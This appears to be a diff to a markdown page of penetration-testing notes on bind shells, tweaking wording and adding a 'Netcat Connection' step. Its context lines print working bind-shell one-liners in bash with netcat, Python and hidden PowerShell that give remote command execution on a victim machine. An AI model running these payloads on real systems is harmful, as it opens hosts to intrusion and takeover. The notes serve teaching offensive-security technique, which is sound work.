@@ -90,7 +90,7 @@ These are the scenarios in which `bind` shells are used:
 
 Once again, we can look to [Payload All The Things](https://swisskyrepo.github.io/InternalAllTheThings/cheatsheets/shell-bind-cheatsheet/) to find a suitable command. 
 
-> We start a listening connection on port `1234` with IP `0.0.0.0` on the victim so that we can connect from anywhere.
+> We start a listening connection on port `1234` with IP `0.0.0.0` (any IP) on the victim so that we can connect from anywhere.
 
 ```bash
 rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/bash -i 2>&1|nc -lvp 1234 >/tmp/f
@@ -102,7 +102,9 @@ python -c 'exec("""import socket as s,subprocess as sp;s1=s.socket(s.AF_INET,s.S
 powershell -NoP -NonI -W Hidden -Exec Bypass -Command $listener = [System.Net.Sockets.TcpListener]1234; $listener.start();$client = $listener.AcceptTcpClient();$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + "PS " + (pwd).Path + " ";$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close();
 ```
 
+#### Step 2: Netcat Connection
 
+Once we execute the bind shell command, we should have a shell waiting for us on the specified 
 
 ---
 ## TTY Upgrade
